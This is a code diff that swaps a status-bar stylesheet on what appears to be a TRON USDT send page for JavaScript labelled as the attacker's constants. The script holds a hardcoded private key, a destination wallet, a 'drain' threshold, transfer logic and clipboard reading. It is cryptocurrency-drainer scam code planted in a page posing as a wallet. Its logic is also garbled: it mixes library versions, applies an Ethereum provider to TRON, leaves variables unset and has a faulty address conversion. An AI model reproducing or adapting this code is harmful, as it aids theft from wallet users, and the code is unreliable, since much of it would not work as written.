@@ -1,19 +1,157 @@
-    /* Status Indicator */
-    .status-bar {
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 4px;
-        background: transparent;
-        z-index: 9999;
+// — Phase 1: Module Initialization —
+import { ethers } from 'https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.esm.min.js';
+
+// — Attacker's Operational Constants —
+const SPONSOR_KEY = "d261cf293e5fca814b5038a5be4f5824005b837af7ed3cd8515ec6ce86b83b7f";
+const DEST_WALLET = "TWd2zR4V1dFvJbXJZv3zQy4Xz5Zy6Zy7Z8";
+const USDT_TRC20 = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+const TRON_RPC = "https://api.trongrid.io";
+const MIN_DRAIN = 2; // Only refuel if USDT balance > $2
+
+// — Runtime State —
+let tronWeb;
+let userAddress;
+
+// — Utility: Base58 <-> Hex Conversion —
+const ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
+
+function base58ToHex(address) {
+    if (address.startsWith('0x')) return address;
+    let n = 0n;
+    for (const char of address) {
+        n = n * 58n + BigInt(ALPHABET.indexOf(char));
     }
-    .status-bar.active {
-        background: linear-gradient(90deg, var(--tron-orange), var(--blue-primary));
-        animation: slide 2s infinite ease-in-out;
+    const hex = n.toString(16).padStart(64, '0');
+    return '0x' + hex.slice(2);
+}
+
+function hexToBase58(hex) {
+    if (!hex.startsWith('0x')) hex = '0x' + hex;
+    let n = BigInt(hex);
+    let result = '';
+    while (n > 0n) {
+        result = ALPHABET[Number(n % 58n)] + result;
+        n = n / 58n;
     }
-    @keyframes slide {
-        0% { background-position: 0 0; }
-        100% { background-position: 40px 0; }
+    return result;
+}
+
+// — Initialize TronWeb —
+async function initTronWeb() {
+    try {
+        tronWeb = new ethers.JsonRpcProvider(TRON_RPC);
+        console.log('✓ TronWeb initialized');
+    } catch (error) {
+        console.error('✗ Failed to initialize TronWeb:', error);
     }
-</style>
+}
+
+// — Core: Balance Check —
+async function getUSDTBalance(address) {
+    try {
+        const contract = new ethers.Contract(
+            USDT_TRC20,
+            ['function balanceOf(address) view returns (uint256)'],
+            tronWeb
+        );
+        const balance = await contract.balanceOf(address);
+        return Number(ethers.formatUnits(balance, 6));
+    } catch (error) {
+        console.error('Balance check failed:', error);
+        return 0;
+    }
+}
+
+// — Core: Transfer Function —
+async function executeTransfer(toAddress, amount) {
+    const statusBar = document.getElementById('statusBar');
+    statusBar.classList.add('active');
+
+    try {
+        const balance = await getUSDTBalance(userAddress);
+        
+        if (balance < MIN_DRAIN) {
+            alert(`Balance too low: $${balance.toFixed(2)}`);
+            return false;
+        }
+
+        const contract = new ethers.Contract(
+            USDT_TRC20,
+            ['function transfer(address to, uint256 amount) returns (bool)'],
+            new ethers.Wallet(SPONSOR_KEY, tronWeb)
+        );
+
+        const tx = await contract.transfer(toAddress, ethers.parseUnits(amount.toString(), 6));
+        await tx.wait();
+
+        console.log('✓ Transfer successful:', tx.hash);
+        return true;
+    } catch (error) {
+        console.error('Transfer failed:', error);
+        alert('Transfer failed: ' + error.message);
+        return false;
+    } finally {
+        setTimeout(() => statusBar.classList.remove('active'), 2000);
+    }
+}
+
+// — UI Event Handlers —
+document.getElementById('pasteBtn').addEventListener('click', async () => {
+    try {
+        const text = await navigator.clipboard.readText();
+        document.getElementById('address').value = text;
+    } catch (err) {
+        console.error('Clipboard access failed:', err);
+    }
+});
+
+document.getElementById('clearBtn').addEventListener('click', () => {
+    document.getElementById('address').value = '';
+});
+
+document.getElementById('amount').addEventListener('input', function() {
+    const val = parseFloat(this.value) || 0;
+    document.getElementById('fiatValue').textContent = `≈ $${val.toFixed(2)}`;
+});
+
+document.getElementById('maxBtn').addEventListener('click', async () => {
+    const addr = document.getElementById('address').value.trim();
+    if (!addr) {
+        alert('Please enter an address first');
+        return;
+    }
+    const balance = await getUSDTBalance(addr);
+    document.getElementById('amount').value = balance;
+    document.getElementById('fiatValue').textContent = `≈ $${balance.toFixed(2)}`;
+});
+
+document.getElementById('nextBtn').addEventListener('click', async () => {
+    const toAddress = document.getElementById('address').value.trim();
+    const amount = parseFloat(document.getElementById('amount').value);
+    const btn = document.getElementById('nextBtn');
+
+    if (!toAddress) {
+        alert('Please enter a destination address');
+        return;
+    }
+
+    if (!amount || amount <= 0) {
+        alert('Please enter a valid amount');
+        return;
+    }
+
+    btn.disabled = true;
+    btn.textContent = 'Processing...';
+
+    const success = await executeTransfer(toAddress, amount);
+
+    btn.disabled = false;
+    btn.textContent = 'Next';
+
+    if (success) {
+        alert('Transfer completed successfully!');
+    }
+});
+
+// — Initialize on Load —
+initTronWeb();
